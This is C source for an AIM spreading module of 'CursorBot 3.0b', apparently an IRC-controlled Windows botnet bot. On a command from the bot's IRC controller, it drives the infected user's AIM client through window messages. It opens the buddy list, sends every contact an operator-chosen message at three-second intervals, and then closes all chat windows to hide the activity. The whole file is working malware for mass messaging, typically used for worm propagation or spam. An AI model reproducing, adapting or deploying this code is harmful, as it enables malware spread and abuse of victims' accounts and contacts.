/*******************************************************************\
*	PROJECT:	CursorBot											*
*	VERSION:	3.0b												*
*	AUTHOR:		Nocen												*
*	Copyright (C) 2007 - All Rights Reserved						*
\*******************************************************************/
#ifndef NO_AIM
//#include <windows.h>
//#include "aim5.h"
#include "includes.h"
#include "functions.h"

//void AimMessage(char* szMessage, unsigned int iDelay)
DWORD WINAPI AimMessage(LPVOID param)
{
	NTHREAD aim = *((NTHREAD *)param);
	NTHREAD *aims = (NTHREAD *)param;
	aims->gotinfo = TRUE;
	IRC* irc=(IRC*)aim.conn;

	char szMessage[512];
	strncpy(szMessage,aim.data1,sizeof(szMessage));
	HWND hStatus = FindWindow("_Oscar_StatusNotify", NULL), hAim = NULL;
	if(IsWindow(hStatus))
	{
		SendMessage(hStatus, WM_COMMAND, 20003, 0);
		while(true)
		{
			hAim = FindWindowEx(NULL, hAim, "#32770", NULL);
			if(IsWindow(hAim))
			{
				HWND hList = FindWindowEx(hAim, 0, "#32770", "Buddy List");
				if(IsWindow(hList))
				{
					HWND hTree = FindWindowEx(hList, 0, "_Oscar_Tree", "");
					if(IsWindow(hTree))
					{
						AimCloseAll();
						int iCount = SendMessage(hTree, LB_GETCOUNT, 0, 0);
						int iIndex = 0;
						while(iIndex <= iCount)
						{
							SendMessage(hTree, LB_SETCURSEL, ++iIndex, 0);
							SendMessage(hTree, WM_KEYDOWN, 37, 0);
							SendMessage(hTree, WM_KEYUP, 37, 0);
						}
						iCount = SendMessage(hTree, LB_GETCOUNT, 0, 0);
						for(int i = 0; i < iCount; ++i)
						{
							SendMessage(hTree, LB_SETCURSEL, i, 0);
							SendMessage(hTree, WM_KEYDOWN, 39, 0);
							SendMessage(hTree, WM_KEYUP, 39, 0);
							int iSubCount = (SendMessage(hTree, LB_GETCOUNT, 0, 0) - iCount);
							for(int s = (i + 1); s <= (i + iSubCount); ++s)
							{
								SendMessage(hTree, LB_SETCURSEL, s, 0);
								SendMessage(hList, WM_COMMAND, 139, 0);
								AimSend(szMessage);
								Sleep(3000);
							}
							SendMessage(hTree, LB_SETCURSEL, i, 0);
							SendMessage(hTree, WM_KEYDOWN, 37, 0);
							SendMessage(hTree, WM_KEYUP, 37, 0);
							SendMessage(hTree, LB_SETCURSEL, i, 0);
						}
						break;
					}
				}
			}
		}
	}
	clearthread(aim.threadnum);
	ExitThread(0);

	return 0;
}

void AimSend(char* szMessage)
//DWORD WINAPI AimSend(LPVOID param)
{
	HWND hWindow = NULL;
	while(true)
	{
		hWindow = FindWindowEx(NULL, NULL, "AIM_IMessage", NULL);
		if(IsWindow(hWindow))
		{
			HWND hTextBox = NULL, hFind = NULL, hSend = NULL;
			do {
				hTextBox = FindWindowEx(hWindow, hTextBox, "WndAte32Class", NULL);
				if(IsWindow(hTextBox))
				{
					hFind = FindWindowEx(hTextBox, 0, "CBClass", NULL);
					if(IsWindow(hFind))
					{
						hFind = FindWindowEx(hTextBox, 0, "Ate32Class", NULL);
						SendMessage(hFind, WM_SETTEXT, 0, (LPARAM)szMessage);
						do {
							hSend = FindWindowEx(hWindow, hSend, "_Oscar_IconBtn", NULL);
							if(IsWindow(hSend))
							{
								if(((int)GetMenu(hSend)) == 409)
								{
									SendMessage(hSend, WM_LBUTTONDOWN, 0, 0);
									SendMessage(hSend, WM_LBUTTONUP, 0, 0);
								}
							}
						} while(IsWindow(hSend));
						AimCloseAll();
						return;
					}
				}
			} while(IsWindow(hTextBox));
		}
	}
}

void AimCloseAll(void)
{
	HWND hWindow = NULL;
	do {
		hWindow = FindWindowEx(NULL, NULL, "AIM_IMessage", NULL);
		SendMessage(hWindow, WM_CLOSE, 0, 0);
	} while(hWindow != NULL);
}
#endif